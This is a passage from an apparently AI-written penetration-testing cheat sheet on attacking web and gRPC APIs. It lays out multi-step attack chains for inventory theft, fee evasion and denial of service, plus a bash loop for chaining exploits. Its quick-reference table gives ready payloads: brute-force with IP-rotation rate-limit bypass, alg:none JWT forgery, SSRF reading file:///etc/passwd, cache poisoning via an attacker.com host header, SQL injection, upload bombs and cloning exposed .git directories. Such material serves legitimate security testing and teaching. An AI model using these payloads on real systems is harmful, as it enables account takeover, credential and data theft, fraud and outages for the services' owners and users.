        B1["Broken Auth<br/>brute-force weak pw"] --> B2["BFLA<br/>hit discount endpoint"] --> B3["Unrestricted Upload<br/>fill the disk"] --> B4["Resell + DoS"]
    end
    subgraph C3["Chain 3 — inventory theft"]
        direction LR
        D1["Data Exposure<br/>emails + phones"] --> D2["IDOR<br/>enumerate supplier IDs"] --> D3["Race Condition<br/>bypass stock check"] --> D4["Buy all stock cheap"]
    end
```



### Example Chain 1: BOLA + Mass Assignment + SSRF

```
1. Use BOLA to enumerate all supplier company IDs (1-100)
2. Use mass assignment to set isExemptedFromMarketplaceFee=1 on each (PATCH endpoint)
3. Use SSRF to read internal analytics (certificateURI field accepts file://)
4. Extract admin credentials from config files
5. Compromise the entire marketplace
```

### Example Chain 2: Broken Authentication + BFLA + Unrestricted Resource Consumption

```
1. Brute-force weak customer password (no rate-limiting)
2. Use brute-forced account to bypass role checks (BFLA on discount endpoint)
3. See all product discount dates
4. Upload huge certificate files 10x over (unrestricted uploads)
5. Resell discounted products after discount expires
6. Disk fills up → denial-of-service
```

### Example Chain 3: Data Exposure + IDOR + Race Condition

```
1. Find /api/v1/suppliers returns email + phone (excessive data exposure)
2. Enumerate all supplier IDs via IDOR
3. Send parallel purchase requests as each supplier
4. Race condition bypasses inventory checks
5. Buy all stock at discount prices under different identities
```

### Chain Exploitation Workflow

```bash
# Step 1: Map the API and identify overlapping vulnerabilities
for endpoint in $(curl -s "http://<api>/swagger.json" | jq -r '.paths | keys[]'); do
  echo "Testing $endpoint..."
  # Check: does it require auth? (BFLA)
  # Check: does it return PII? (data exposure)
  # Check: can I swap IDs? (BOLA)
  # Check: can I modify fields I shouldn't? (mass assignment)
done

# Step 2: Identify which flaws enable others
# e.g., "If I can enumerate users via BOLA, and users have default weak passwords, 
#        I can brute-force them"

# Step 3: Execute the chain in order
# Flaw A → Flaw B → Flaw C → Desired Impact
```

> [!tip]
> Document each flaw's impact individually, then show how they compound. A single BOLA might be low-risk, but BOLA + mass assignment + SSRF = full compromise. Chains sell the severity to stakeholders.

---

## Quick Reference

| Goal | Payload / Technique |
|---|---|
| Enum endpoints | `curl -s "http://<api>/swagger.json" \| jq '.paths \| keys'` |
| Fingerprint tech | `curl -i <api> \| grep -iE "Server\|X-Powered-By\|X-AspNet"` |
| Find hidden endpoints | `ffuf -w api-endpoints.txt -u "http://<api>/api/FUZZ" -mc 200,401,403` |
| Spot a gRPC service | `content-type: application/grpc`, path `/package.Service/Method`, `grpc-status` header |
| List gRPC services (reflection) | `grpcurl -plaintext <TARGET_IP>:<PORT> list` |
| Describe a gRPC method | `grpcurl -plaintext <TARGET_IP>:<PORT> describe my.pkg.Service.Method` |
| Dump `.proto` from reflection | `grpcurl -plaintext -proto-out-dir ./protos <TARGET_IP>:<PORT> describe my.pkg.Service` |
| Call a gRPC method | `grpcurl -plaintext -d '{"id":1234}' <TARGET_IP>:<PORT> my.pkg.Service/GetAccount` |
| gRPC with auth header | `grpcurl -plaintext -H 'authorization: Bearer <tok>' -d '{}' <TARGET>:<PORT> svc/Method` |
| Decode protobuf, no schema | `protoc --decode_raw < captured_body.bin` |
| Is the HMAC even checked? | Send a wrong signature, an empty one, then drop the header entirely |
| Replay test a signed request | Resend a captured signed request verbatim — accepted later/twice = no timestamp or nonce |
| BOLA enumeration | loop `ID=1..100` in URL path / query |
| Test weak password | `curl -X PATCH ... -d '{"password":"123456"}'` |
| Brute-force login | `ffuf -w emails.txt:EMAIL -w passwords.txt:PASS -d '{"Email":"EMAIL","Password":"PASS"}' -fr "Invalid"` |
| Rate-limit bypass (IP rotation) | `-H "X-Forwarded-For: 192.168.$RANDOM.$RANDOM"` |
| Decode JWT (base64URL) | `echo $TOKEN \| cut -d. -f2 \| tr '_-' '/+' \| base64 -d \| jq` |
| Algorithm confusion JWT | Craft token with `{"alg":"none"}` and no signature |
| Mass assignment | `curl -X PATCH ... -d '{"field_you_shouldnt_touch":1}'` |
| Race condition exploit | `seq 1 10 \| parallel -j 10 'curl -X POST <url>' ` |
| HTTP method override | `-H "X-HTTP-Method-Override: DELETE"` on POST request |
| File upload bomb | `dd if=/dev/urandom of=huge.pdf bs=1M count=100` → upload 10x |
| Check cache headers | `curl -i <api> \| grep -i cache-control` |
| Cache poisoning | inject header like `-H "X-Forwarded-Host: attacker.com"` in POST |
| Find API keys in errors | `curl <api>/api/v1/config` → look for "Password=", "key=", "token=" |
| Find leaked keys in git | `curl http://<api>/.git/config && git clone <api>/.git` |
| Check endpoint auth | call endpoint without JWT, or with user lacking required role |
| SSRF via file path | set URI field to `file:///etc/passwd`, fetch it back |
| Webhook/callback SSRF | register webhook with `CallbackURL: http://127.0.0.1/admin` |
| Check CORS policy | `curl -i -H "Origin: attacker.com" <api>` → check Allow-Origin header |
| SQL injection test | append `' OR 1=1 --` to string search parameter |
| Check old API versions | enumerate `v0`, `v1-beta`, test without auth |
| Chain exploits | BOLA → enum IDs → mass assignment → escalate → SSRF → RCE |
| Decode base64 response | `echo "..." \| base64 -d` |

---

*Created: 2026-07-15*
*Updated: 2026-09-22*
*Model: claude-opus-5*
